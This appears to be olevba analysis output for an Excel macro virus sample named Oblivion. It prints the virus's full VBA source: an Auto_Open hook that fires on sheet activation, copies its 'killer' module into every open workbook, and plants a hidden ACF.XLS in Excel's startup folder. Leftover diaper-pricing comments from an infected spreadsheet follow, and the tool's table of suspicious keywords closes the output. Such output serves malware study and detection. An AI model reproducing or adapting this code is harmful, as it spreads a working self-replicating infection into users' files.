olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Oblivion-1149b7135552de47418f09b5de0b34c79f23c985
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Oblivion-1149b7135552de47418f09b5de0b34c79f23c985 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Ark1.cls 
in file: Virus.MSExcel.Oblivion-1149b7135552de47418f09b5de0b34c79f23c985 - OLE stream: '_VBA_PROJECT_CUR/VBA/Ark1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Ark2.cls 
in file: Virus.MSExcel.Oblivion-1149b7135552de47418f09b5de0b34c79f23c985 - OLE stream: '_VBA_PROJECT_CUR/VBA/Ark2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Ark3.cls 
in file: Virus.MSExcel.Oblivion-1149b7135552de47418f09b5de0b34c79f23c985 - OLE stream: '_VBA_PROJECT_CUR/VBA/Ark3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO killer.bas 
in file: Virus.MSExcel.Oblivion-1149b7135552de47418f09b5de0b34c79f23c985 - OLE stream: '_VBA_PROJECT_CUR/VBA/killer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Sub Auto_Open()
    Application.OnSheetActivate = "kill"
End Sub
Sub KILL()
    sStpath = Application.StartupPath
    vname = Dir(sStpath & "\" & "ACF.XLS")
    If UCase(vname) = "ACF.XLS" Then
        p = 1
    Else
        p = 0
    End If
    If UCase(ActiveWorkbook.Name) = "ACF.XLS" Then
        ActiveWindow.Visible = False
    Else
        Select Case p
            Case 1
                Application.ScreenUpdating = False
                oldfname = ActiveWorkbook.Name
                thisfname = ThisWorkbook.Name
                NumOfCmp = ActiveWorkbook.VBProject.VBComponents.Count
                For n = 1 To NumOfCmp
                    ntype = ActiveWorkbook.VBProject.VBComponents(n).Type
                   If ntype = 1 And ActiveWorkbook.VBProject.VBComponents(n).Name = "killer" Then
                        w = 1
                        Exit For
                    Else
                        If n = NumOfCmp Then
                            w = 0
                            ActiveWorkbook.VBProject.VBComponents.Add (1)
Set Acts1 = Workbooks(oldfname).VBProject.VBComponents(n + 1)
Set shashou = Workbooks(thisfname).VBProject.VBComponents("killer")
                            ssCl = shashou.CodeModule.CountOfLines
                            For i = 1 To ssCl
                            Acts1.CodeModule.InsertLines i, shashou.CodeModule.Lines(i, 1)
                           Next i
                            Acts1.Name = "killer"
                        End If
                    End If
                Next n
                Application.ScreenUpdating = True
            Case 0
                Application.ScreenUpdating = False
                thisfname = ThisWorkbook.Name
                Workbooks.Add
                With ActiveWorkbook
                    .Title = ""
                    .Subject = ""
                    .Author = ""
                    .Keywords = ""
                    .Comments = ""
                End With
                newfname = ActiveWorkbook.Name
                NumOfCmp = ActiveWorkbook.VBProject.VBComponents.Count
                For n = 1 To NumOfCmp
                    ntype = ActiveWorkbook.VBProject.VBComponents(n).Type
                    If ntype = 1 Then
                        w = 1
                        Exit For
                    Else
                        If n = NumOfCmp Then
                            w = 0
                            ActiveWorkbook.VBProject.VBComponents.Add (1)
                        End If
                    End If
                Next n
                Set Acts1 = Workbooks(newfname).VBProject.VBComponents(n)
                Set shashou = Workbooks(thisfname).VBProject.VBComponents("killer")
                ssCl = shashou.CodeModule.CountOfLines
                For i = 1 To ssCl
                Acts1.CodeModule.InsertLines i, shashou.CodeModule.Lines(i, 1)
                Next i
                Acts1.Name = "killer"
                Workbooks(newfname).SaveAs FileName:=sStpath & "\" & "BOOK1.XLS"
                Workbooks("BOOK1.XLS").SaveAs FileName:=sStpath & "\" & "ACF.XLS"
                Windows("ACF.XLS").Visible = False
                Workbooks("ACF.XLS").Save
                Application.OnSheetActivate = ""
                Application.ScreenUpdating = True
                Application.OnSheetActivate = "ACF.XLS!kill"
        End Select
    End If
End Sub
   ' Off Invoice Worksheet
    'Information MUST be entered by the AE

'A  -  Add - New Distribution or New Rate or First Order Date                    Wal Mart
                                                
'C -  Change  - Last Order Date ONLY                 SCCN:       65601
                                                
'Change Process requires two steps:                  Promotion Code      500
'End existing allowance
'Add New Allowance wiith new first order date and last order dates
'Minimum of ONE day break between last order date of existing allowance and first order date of new allowance
                                                
'(A) dd, (C)hange    Case UPC    Item UPC    P&P brand id    SUC          (Brand Code)   P&P brand description   Sell Units  Size        BDF OI Rate to Pay  First order Date    Last order Date Allowance Code
'C   3700034776  3700034776      38681   Pampers Super Mega Pack Sz 1    1   136 CT  $1.27   8/17/00 12/31/01    9DRBA
'C   3700034777  3700034777      38683   Pampers Super Mega Pack Sz 2    3   116 CT  $3.81   8/17/00 12/31/01    9ELKM
'C   3700034778  3700034778      38684   Pampers Super Mega Pack Sz 3    3   96  CT  $3.81   8/17/00 12/31/01    93ECM
'C   3700034779  3700034779      38685   Pampers Super Mega Pack Sz 4    3   84  CT  $3.81   8/17/00 12/31/01    9MWSK
'C   3700034780  3700034780      38697   Pampers Super Mega Pack Sz 5    3   76  CT  $3.81   8/17/00 12/31/01    80YZ0
                                                
'C   3700034851  3700034851      39435   Pampers Prem. Super Mega Sz 3   3   76  CT  $2.88   8/17/00 12/31/01    8JA7S
'C   3700034852  3700034852      39443   Pampers Prem. Super Mega Sz 4   3   68  CT  $2.88   8/17/00 12/31/01    828P1
'C   3700034853  3700034853      39445   Pampers Prem. Super Mega Sz 5   3   60  CT  $2.88   8/17/00 12/31/01    9CGAG
                                                
'C   3700034742  3700034742      38272   Luvs Super Mega Sz 3    3   96  CT  $2.94   8/17/00 12/31/01    92HVR
'C   3700034806  3700034806      38888   Luvs Super Mega Sz 4    3   84  CT  $2.94   8/17/00 12/31/01    9NMUG
'C   3700034807  3700034807      38890   Luvs Super Mega Sz 5    3   76  CT  $2.94   8/17/00 12/31/01    8Y10Q
                                                
'A   3700034763  3700034763      38654   Pampers Bdry Jumbo Sz 1 3   68  CT  $0.85   8/17/00 12/31/01
'A   3700034764  3700034764      38655   Pampers Bdry Jumbo Sz 2 3   58  CT  $0.85   8/17/00 12/31/01
'A   3700034765  3700034765      38656   Pampers Bdry Jumbo Sz 3 3   48  CT  $0.85   8/17/00 12/31/01
'A   3700034766  3700034766      38657   Pampers Bdry Jumbo Sz 4 3   42  CT  $0.85   8/17/00 12/31/01
'A   3700034767  3700034767      38658   Pampers Bdry Jumbo Sz 5 3   38  CT  $0.85   8/17/00 12/31/01
'A   3700034768  3700034768      38659   Pampers Bdry Jumbo Sz 6 3   32  CT  $0.85   8/17/00 12/31/01
                                                
'A   3700034762  3700034762      38653   Pampers Premium JP Newborn  3   48  CT  $1.29   8/17/00 12/31/01
'A   3700034818  3700034818      39084   Pampers Premium JP Sz1  3   50  CT  $1.29   8/17/00 12/31/01
'A   3700034819  3700034819      39090   Pampers Premium JP Sz2  3   44  CT  $1.29   8/17/00 12/31/01
'A   3700034820  3700034820      39092   Pampers Premium JP Sz3  3   38  CT  $1.29   8/17/00 12/31/01
'A   3700034821  3700034821      39093   Pampers Premium JP Sz4  3   34  CT  $1.29   8/17/00 12/31/01
'A   3700034822  3700034822      39097   Pampers Premium JP Sz5  3   30  CT  $1.29   8/17/00 12/31/01
                                                
'A   3700034856  3700034856      39457   Pampers Rash Care JP Sz Small   3   42  CT  $1.00   8/17/00 12/31/01
'A   3700034858  3700034858      39459   Pampers Rash Care JP Sz Medium  3   30  CT  $1.00   8/17/00 12/31/01
'A   3700034859  3700034859      39462   Pampers Rash Care JP Sz Large   3   27  CT  $1.00   8/17/00 12/31/01
                                                


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Ark
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Ark
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Ark
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

